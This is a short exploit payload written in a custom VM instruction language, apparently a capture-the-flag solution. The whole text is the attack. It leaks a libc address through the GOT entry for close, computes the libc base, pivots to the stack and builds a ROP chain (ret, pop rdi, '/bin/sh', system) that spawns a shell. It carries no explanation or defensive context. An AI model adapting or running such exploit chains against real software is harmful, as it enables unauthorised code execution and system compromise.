BEGIN_VM

  MOVI(KAX, 0x406F78-0x18) // got.close
  AGE(KAX)
  AGD()

  PUSH(KRX)
  POP(KAX)

  SUBI(KAX, 0x1108c0)
  MOV(KBX, KAX)

  ADDI(KAX, 0x3ee098-0x18)
  AGE(KAX)
  AGD()

  PUSH(KRX)
  POP(KAX)

  SUBI(KAX, 0x20c8)
  MOV(KSP, KAX)
  DST()

  // ret
  MOVI(KAX, 0x4034DB)
  PUSH(KAX)

  // pop rdi
  MOVI(KAX, 0x000000000040362b)
  PUSH(KAX)

  // /bin/sh
  MOVI(KAX, 0x01b3e9a)
  ADD(KAX, KBX)
  PUSH(KAX)

  // system
  MOVI(KAX, 0x4f440)
  ADD(KAX, KBX)
  PUSH(KAX)
END_VM
